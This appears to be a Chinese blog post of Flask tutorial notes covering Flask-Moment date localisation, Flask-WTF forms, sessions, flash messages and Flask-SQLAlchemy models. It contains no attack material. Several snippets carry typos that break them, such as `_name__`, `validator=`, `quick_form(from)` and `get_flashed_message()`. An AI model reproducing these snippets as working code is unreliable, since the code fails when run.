<h3 id="六、使用Flask-Moment本地化日期和时间"><a href="#六、使用Flask-Moment本地化日期和时间" class="headerlink" title="六、使用Flask-Moment本地化日期和时间"></a>六、使用Flask-Moment本地化日期和时间</h3><p>服务器一般使用协调世界时（UTC）来统一时间，但是把时间发送个Web浏览器时需要转换成当地时间，然后用Javascript渲染。</p>
<p>Flask-Moment是一个Flask扩展，能简化把Moment.js 集成到 Jinja2 模板中的过程。</p>
<p>使用pip在虚拟环境中安装 flask-moment 之后同样需要进行初始化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line">moment = Moment(app)</span><br></pre></td></tr></table></figure>
<p>除了Moment.js， Flask-Moment 还依赖 jQuery.js。因此要在 HTML 文档的某个地方引入这两个库。Bootstrap 已经引入了 jQuery.js，因此只需引入 Moment.js 即可。</p>
<p>在基模板中的 scripts 块中引入这个库，同时保留原始内容。<br>在 templates/base.html 的任何位置引入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% block scripts %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line">&#123;&#123; moment.include_moment() &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>为了处理时间戳，Flask-Moment 向模板开放了 moment 对象，下例把变量 <code>current_time</code> 传入模板进行渲染：</p>
<p>hello.py：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, current_time=datetime.utcnow())</span><br></pre></td></tr></table></figure></p>
<p>然后在index.html 中渲染模板变量 current_time</p>
<p>templates/index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Hello World!&amp;lt;/h1&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&amp;lt;p&gt;The local date and time is &#123;&#123; moment(current_time).format('LLL') &#125;&#125;.&amp;lt;/p&gt;</span><br><span class="line">&amp;lt;p&gt;That was &#123;&#123; moment(current_time).fromNow(refresh=True) &#125;&#125;&amp;lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>format(&#39;LLL&#39;)</code>函数根据客户端计算机中的时区和区域设渲染日期和时间。参数决定了渲染的方式，从 <code>&#39;L&#39;</code> 到 <code>&#39;LLLL&#39;</code> 分别对应不同的复杂度。format() 函数还可接受很多自定义的格式说明符。</p>
<p>第二行中的 <code>fromNow()</code> 渲染相对时间戳，而且会随着时间的推移自动刷新显示的时间。这个时间戳最开始显示为 <code>a few seconds ago</code>，但设定 <code>refresh=True</code> 参数后，其内容会随着时间的推移而更新。</p>
<p>Moment.js文档：<a href="http://momentjs.com/docs/#/displaying/" target="_blank" rel="noopener">http://momentjs.com/docs/#/displaying/</a> </p>
<p>效果如下：<br><img src="/2020/02/01/Flask-Notes/20200129152228157.png" alt="在这里插入图片描述"></p>
<p>另外，Flask-Moment渲染的时间还可以实现多种语言的本地化，方法时在引入 Moment.js 后， 立即把两个字母的语言代码传给 <code>locale()</code> 函数，如西班牙语方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% block scripts %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line">&#123;&#123; moment.include_moment() &#125;&#125;</span><br><span class="line">&#123;&#123; moment.locale(<span class="string">'es'</span>) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h1 id="0x03-表单"><a href="#0x03-表单" class="headerlink" title="0x03 表单"></a>0x03 表单</h1><p>在Flask中，通常使用Flask-WTF扩展来对Web表单进行处理，这样更加方便。首先在虚拟环境中安装此扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-wtf</span><br></pre></td></tr></table></figure>
<h3 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h3><p>Flask-WTF扩展不用在应用层初始化，但是需要配置一个密钥（SECRET_KEY），Flask 使用这个密钥保护用户会话，以防被篡改，也就是防止 CSRF 攻击。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app = Flask(_name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br></pre></td></tr></table></figure>
<p>app.config 字典可用于存储 Flask、扩展和应用自身的配置变量。实际上为了增强安全性，密钥不应该直接写入源码，而要保存在环境变量中。</p>
<p>&lt;br&gt;</p>
<h3 id="二、表单类"><a href="#二、表单类" class="headerlink" title="二、表单类"></a>二、表单类</h3><p>使用Flask-WTF时，服务端的每个Web表单都由一个继承自 FlaskForm 的类表示。这个类定义表单中的一组字段，每个字段都用对象表示。字段对象可附属一个或多个验证函数 。验证函数用于验证用户提交的数据是否有效。</p>
<p>下面的表单示例中包含一个文本字段和一个提交按钮：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validator=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中：</p>
<ul>
<li>StringField 类表示属性为 <code>type=&quot;text&quot;</code> HTML <code>&amp;lt;input&gt;</code> 元素。</li>
<li>SubmitField 类表示属性为 <code>type=&quot;submit&quot;</code> 的HTML元素 <code>&amp;lt;input&gt;</code> 元素。</li>
<li>字段构造函数的第一个参数代表使用的标注（label）</li>
<li>StringField 构造函数中的可选参数 validators 指定一个由验证函数组成的列表，在接收数据前对数据进行验证（DataRequired 确保提交的数据不为空）</li>
</ul>
<p>WTForms 支持的 HTML 标准字段：</p>
<table>
<thead>
<tr>
<th>字段类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>BooleanField</td>
<td>复选框，值为 True 和 False</td>
</tr>
<tr>
<td>DateField</td>
<td>文本字段，值为 datetime.date 格式</td>
</tr>
<tr>
<td>DateTimeField</td>
<td>文本字段，值为 datetime.datetime 格式</td>
</tr>
<tr>
<td>DecimalField</td>
<td>文本字段，值为 decimal.Decimal</td>
</tr>
<tr>
<td>FileField</td>
<td>文件上传字段</td>
</tr>
<tr>
<td>HiddenField</td>
<td>隐藏的文本字段</td>
</tr>
<tr>
<td>MultipleFileField</td>
<td>多文件上传字段</td>
</tr>
<tr>
<td>FieldList</td>
<td>一组指定类型的字段</td>
</tr>
<tr>
<td>FloatField</td>
<td>文本字段，值为浮点数</td>
</tr>
<tr>
<td>FormField</td>
<td>把一个表单作为字段嵌入另一个表单</td>
</tr>
<tr>
<td>IntegerField</td>
<td>文本字段，值为整数</td>
</tr>
<tr>
<td>PasswordField</td>
<td>密码文本字段</td>
</tr>
<tr>
<td>RadioField</td>
<td>一组单选按钮</td>
</tr>
<tr>
<td>SelectField</td>
<td>下拉列表</td>
</tr>
<tr>
<td>SelectMultipleField</td>
<td>下拉列表，可选择多个值</td>
</tr>
<tr>
<td>SubmitField</td>
<td>表单提交按钮</td>
</tr>
<tr>
<td>StringField</td>
<td>文本字段</td>
</tr>
<tr>
<td>TextAreaField</td>
<td>多行文本字段</td>
</tr>
</tbody>
</table>
<p>WTForms 验证函数：</p>
<table>
<thead>
<tr>
<th>验证函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>DataRequired</td>
<td>确保转换类型后字段中有数据</td>
</tr>
<tr>
<td>Email</td>
<td>验证电子邮件地址</td>
</tr>
<tr>
<td>EqualTo</td>
<td>比较两个字段的值；常用于要求输入两次密码进行确认的情况</td>
</tr>
<tr>
<td>InputRequired</td>
<td>确保转换类型前字段中有数据</td>
</tr>
<tr>
<td>IPAddress</td>
<td>验证 IPv4 网络地址</td>
</tr>
<tr>
<td>Length</td>
<td>验证输入字符串的长度</td>
</tr>
<tr>
<td>MacAddress</td>
<td>验证 MAC 地址</td>
</tr>
<tr>
<td>NumberRange</td>
<td>验证输入的值在数字范围之内</td>
</tr>
<tr>
<td>Optional</td>
<td>允许字段中没有输入，将跳过其他验证函数</td>
</tr>
<tr>
<td>Regexp</td>
<td>使用正则表达式验证输入值</td>
</tr>
<tr>
<td>URL</td>
<td>验证 URL</td>
</tr>
<tr>
<td>UUID</td>
<td>验证 UUID</td>
</tr>
<tr>
<td>AnyOf</td>
<td>确保输入值在一组可能的值中</td>
</tr>
<tr>
<td>NoneOf</td>
<td>确保输入值不在一组可能的值中</td>
</tr>
</tbody>
</table>
<p>&lt;br&gt;</p>
<h3 id="三、表单渲染"><a href="#三、表单渲染" class="headerlink" title="三、表单渲染"></a>三、表单渲染</h3><p>表单字段是可调用的，在模板中调用后会渲染成HTML。假设视图函数通过 <code>form</code> 参数把上面的 NameForm 实例传入模板，在模板中可以生成一个简单的HTML表单，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;form method="POST"&gt;</span><br><span class="line">    &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">    &#123;&#123; form.name.label &#125;&#125; &#123;&#123; form.name() &#125;&#125;</span><br><span class="line">    &#123;&#123; form.submit() &#125;&#125;</span><br><span class="line">&amp;lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>这里的 <code>form.hidden_tag()</code> 元素生成一个隐藏的字段，用于 CSRF 防护。</p>
<p>在调用字段的时候，传入的关键词参数将转换为字段的<strong>HTML属性</strong>。 如下，指定id或class属性，从而可以定义CSS样式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;form method="POST"&gt;</span><br><span class="line">    &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">    &#123;&#123; form.name.label &#125;&#125; &#123;&#123; form.name(id='my-text-field') &#125;&#125;</span><br><span class="line">    &#123;&#123; form.submit() &#125;&#125;</span><br><span class="line">&amp;lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>在实际渲染及美化表单时，可以直接使用 Bootstrap 的表单样式，通过Flask-Bootstrap扩展，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> <span class="string">"bootstrap/wtf.html"</span> <span class="keyword">as</span> wtf %&#125;</span><br><span class="line">&#123;&#123; wtf.quick_form(<span class="keyword">from</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>使用 import 导入 <code>bootstrap/wtf.html</code> 文件，其中定义了一个用默认Bootstrap 样式渲染的 Flask-WTF 表单对象的辅助函数  <code>wtf.quick_form()</code> ，参数为Flask-WTF 表单对象。</p>
<p>使用Flask-WTF 和 Flask-Bootstrap渲染表单，templates/index.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% import "bootstrap/wtf.html" as wtf %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Hello, &#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;!&amp;lt;/h1&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="四、处理表单"><a href="#四、处理表单" class="headerlink" title="四、处理表单"></a>四、处理表单</h3><p>定义了表单的类，需要在视图函数中对表单进行处理和渲染，下例使用 GET 和 POST 方法处理表单：</p>
<p>hello.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">	form = NameForm()</span><br><span class="line">	<span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">		name = form.name.data <span class="comment"># 将表单中name字段值赋给name</span></span><br><span class="line">		form.name.data = <span class="string">''</span> <span class="comment"># 清空表单</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=name)</span><br></pre></td></tr></table></figure>
<ul>
<li>局部变量 name 用于存放表单中的名字字段，默认值为 None。</li>
<li><code>validate_on_submit()</code> 方法：提交表单后，数据能被所有验证函数接收，返回True；否则返回False。</li>
<li>最后用 <code>render_template()</code> 渲染表单时，将变量name，和对象form传入到模板中。</li>
</ul>
<p>效果如下:<br><img src="/2020/02/01/Flask-Notes/20200130152413507.png" alt="在这里插入图片描述"><br>提交Lethe后：<br><img src="/2020/02/01/Flask-Notes/20200130152441302.png" alt="在这里插入图片描述"><br>&lt;br&gt;</p>
<h3 id="五、重定向和用户会话"><a href="#五、重定向和用户会话" class="headerlink" title="五、重定向和用户会话"></a>五、重定向和用户会话</h3><p>在实际情况中，最好别让Web应用把 POST 请求作为浏览器发送的最后一个请求，因此可以使用重定向作为POST请求的响应。</p>
<p>如在用POST方式提交完表单后，再向重定向的URL发送GET请求，显示页面的内容，用户不会察觉到有所不同，这叫做 <strong>“POST / 重定向 / GET”</strong> 模式。</p>
<p>在这种模式下，应用处理POST请求时，需要用变量保存输入的数据，否则一旦重定向后，就无法再通过form.name.data获取POST请求中的字段值。</p>
<p>应用也可以把数据存储在用户会话（session）中，以便在请求之间“记住”数据。用户会话是一种私有存储，每个连接到服务器的客户端都可访问。</p>
<p>改进后的hello.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	form = NameForm()</span><br><span class="line">	<span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">		session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>相比于上一个例子中，将 name保存在局部变量中，这里将其保存在了用户会话中，即 session[‘name’]。</li>
<li>若表单数据有效，则会用 redirect() 函数进行重定向，其参数为URL，因此可以使用辅助函数 url_for() 来生成URL，这里即重定向到根URL。</li>
<li>视图函数在向模板传参时，通过 session.get(‘name’) 从session中取出数据</li>
</ul>
<p>&lt;br&gt;</p>
<h3 id="六、闪现消息"><a href="#六、闪现消息" class="headerlink" title="六、闪现消息"></a>六、闪现消息</h3><p>请求完成后，有时需要向用户发送一些提示信息，如用户名或密码无效等，这可以用到闪现消息。</p>
<p>Flask中通过 <code>flash()</code>函数实现此功能：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	form = NameForm()</span><br><span class="line">	<span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">		old_name = session.get(<span class="string">'name'</span>)</span><br><span class="line">		<span class="keyword">if</span> old_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> old_name != form.name.data:</span><br><span class="line">			flash(<span class="string">'Looks like you have changed your name!'</span>)</span><br><span class="line">		session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">		<span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>当两次提交的name不一样时，就会调用 flash()函数，在发给客户端的下一个响应中显示一个消息。</li>
<li>仅调用 flash() 函数不能将消息显示出来，还需要经过模板的渲染。最好在基模板中渲染闪现消息，这样继承自它的所有页面都能显示要闪现的消息。</li>
</ul>
<p>Flask中用 <code>get_flashed_message()</code> 函数在模板中获取并渲染闪现消息，如下修改emplates/base.html中的 content 块：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">&amp;lt;div class="container"&gt;</span><br><span class="line">    &#123;% for message in get_flashed_message() %&#125;</span><br><span class="line">    &amp;lt;div class="alert alert-warning"&gt;</span><br><span class="line">        &amp;lt;button type="button" class="close" data-dismiss="alert"&gt;&amp;times;&amp;lt;/button&gt;</span><br><span class="line">        &#123;&#123; message &#125;&#125;</span><br><span class="line">    &amp;lt;/div&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>此实例使用Bootstrap 提供的 CSS alert 样式渲染警告消息。</li>
<li>使用了循环，因为在之前的请求循环中每次调用 flash() 函数时都会生成一个消息，所以可能有多个消息在排队等待显示。</li>
<li>get_flashed_messages() 函数获取的消息在下次调用时不会再次返回，因此闪现消息只显示一次，然后就消失了</li>
</ul>
<p>两次提交不同的值，效果如下：</p>
<p><img src="/2020/02/01/Flask-Notes/20200130162436342.png" alt="在这里插入图片描述"></p>
<p>&lt;br&gt;</p>
<h1 id="0x04-数据库"><a href="#0x04-数据库" class="headerlink" title="0x04 数据库"></a>0x04 数据库</h1><p>这里我们使用 <strong>Flask-SQLAlchemy</strong> 扩展来进行数据库操作，SQLAlchemy 是一个强大的关系型数据库框架，支持多种数据库后台。SQLAlchemy 提供了高层 ORM，也提供了使用数据库原生 SQL 的低层功能。</p>
<p>同样现在虚拟环境中安装此扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-sqlalchemy</span><br></pre></td></tr></table></figure>
<h3 id="一、配置-1"><a href="#一、配置-1" class="headerlink" title="一、配置"></a>一、配置</h3><p>在 Flask-SQLAlchemy 中，数据库使用 URL 指定，如下：</p>
<table>
<thead>
<tr>
<th>数据库引擎</th>
<th>URL</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL</td>
<td>mysql://username:password@hostname/database</td>
</tr>
<tr>
<td>Postgres</td>
<td>postgresql://username:password@hostname/database</td>
</tr>
<tr>
<td>SQLite（Linux，macOS）</td>
<td>sqlite:////absolute/path/to/database</td>
</tr>
<tr>
<td>SQLite（Windows）</td>
<td>sqlite:///c:/absolute/path/to/database</td>
</tr>
</tbody>
</table>
<ul>
<li>hostname：数据库服务所在的主机</li>
<li>database：要使用的数据库名</li>
<li>username：数据库用户名</li>
<li>password：数据库密码</li>
</ul>
<p>注意：</p>
<ul>
<li>SQLite 数据库没有服务器，因此不用指定 hostname、username 和 password。URL 中的 database 是磁盘中的文件名。</li>
<li>使用的数据库URL必须保存到 Flask 配置对象的 <code>SQLALCHEMY_DATABASE_URI</code> 键中。</li>
<li>建议把 <code>SQLALCHEMY_TRACK_MODIFICATIONS</code> 键设为 False，以便在不需要跟踪对象变化时降低内存消耗。</li>
</ul>
<p>数据库配置示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义SQLite绝对路径</span></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///'</span> + \</span><br><span class="line">    os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="literal">False</span></span><br><span class="line">db = SQLAlchemy(app) <span class="comment"># 实例化SQLAlchemy</span></span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="二、定义模型"><a href="#二、定义模型" class="headerlink" title="二、定义模型"></a>二、定义模型</h3><p>在 ORM（对象关系映射器）中，模型一般是一个 Python 类，类中的属性对应于数据库表中的列。Flask-SQLAlchemy 实例为模型提供了一个基类以及一系列辅助类和辅助函数，可用于定义模型的结构。</p>
<p>如下实体 – 关系图中的 roles 表和 users 表，我们可以分别定义为 Role 和 User 模型：<br><img src="/2020/02/01/Flask-Notes/20200131142132560.png" alt="在这里插入图片描述"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;User %r&gt;'</span> % self.username</span><br></pre></td></tr></table></figure></p>
<ul>
<li>类变量 <code>__tablename__</code> 定义在数据库中使用的表名，如不定义，则会使用默认的表名。</li>
<li><code>db.Column</code> 类构造函数的第一个参数是数据库列和模型的类型，其他参数则是一些列选项，如主键(primary_key)、索引(index)、不允许重复(unique)等。</li>
<li><code>__repr()__</code> 方法返回一个具有可读性的字符串表示模型，不是强制要求，可方便调试和测试。</li>
</ul>
<p>（1）常用的 SQLAlchemy 列类型：</p>
<table>
<thead>
<tr>
<th>类型名</th>
<th>Python类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Integer</td>
<td>int</td>
<td>普通整数，通常是 32 位</td>
</tr>
<tr>
<td>SmallInteger</td>
<td>int</td>
<td>取值范围小的整数，通常是 16 位</td>
</tr>
<tr>
<td>BigInteger</td>
<td>int 或 long</td>
<td>不限制精度的整数</td>
</tr>
<tr>
<td>Float</td>
<td>float</td>
<td>浮点数</td>
</tr>
<tr>
<td>Numeric</td>
<td>decimal.Decimal</td>
<td>定点数</td>
</tr>
<tr>
<td>String</td>
<td>str</td>
<td>变长字符串</td>
</tr>
<tr>
<td>Text</td>
<td>str</td>
<td>变长字符串，对较长或不限长度的字符串做了优化</td>
</tr>
<tr>
<td>Unicode</td>
<td>unicode</td>
<td>变长 Unicode 字符串</td>
</tr>
<tr>
<td>UnicodeText</td>
<td>unicode</td>
<td>变长 Unicode 字符串，对较长或不限长度的字符串做了优化</td>
</tr>
<tr>
<td>Boolean</td>
<td>bool</td>
<td>布尔值</td>
</tr>
<tr>
<td>Date</td>
<td>datetime.date</td>
<td>日期</td>
</tr>
<tr>
<td>Time</td>
<td>datetime.time</td>
<td>时间</td>
</tr>
<tr>
<td>DateTime</td>
<td>datetime.datetime</td>
<td>日期和时间</td>
</tr>
<tr>
<td>Interval</td>
<td>datetime.timedelta</td>
<td>时间间隔</td>
</tr>
<tr>
<td>Enum</td>
<td>str</td>
<td>一组字符串</td>
</tr>
<tr>
<td>Pickle</td>
<td>Type</td>
<td>任何 Python 对象 自动使用 Pickle 序列化</td>
</tr>
<tr>
<td>LargeBinary</td>
<td>str</td>
<td>二进制 blob</td>
</tr>
</tbody>
</table>
<p>（2）常用的 SQLAlchemy 列选项：</p>
<table>
<thead>
<tr>
<th>选项名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>primary_key</td>
<td>如果设为 True ，列为表的主键</td>
</tr>
<tr>
<td>uniquey</td>
<td>如果设为 True ，列不允许出现重复的值</td>
<td></td>
</tr>
<tr>
<td>indexy</td>
<td>如果设为 True ，为列创建索引，提升查询效率</td>
</tr>
<tr>
<td>nullabley</td>
<td>如果设为 True ，列允许使用空值；如果设为 False ，列不允许使用空值</td>
</tr>
<tr>
<td>defaulty</td>
<td>为列定义默认值</td>
</tr>
</tbody>
</table>
<p>&lt;br&gt;</p>
<h3 id="三、关系"><a href="#三、关系" class="headerlink" title="三、关系"></a>三、关系</h3><p>关系型数据库使用关系把不同表中的行联系起来，上面那个关系图中表示的实际上是一种一对多关系，即一个角色可属于多个用户，而每个用户只能由一个角色。</p>
<p>在数据库模型中定义关系补充如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>将 User 模型中的 role_id 列定义为外键，来联接这两个表。传给 <code>db.ForeignKey()</code> 的参数 <code>roles.id</code> 声明，这列的值是 roles 表中相应行的 id值。</li>
<li>添加到 Role 模型中的 users 属性，代表整个关系的面向对象视角，对于一个 Role 类的实例，其 users 属性将返回与角色相关联的用户组成的列表。</li>
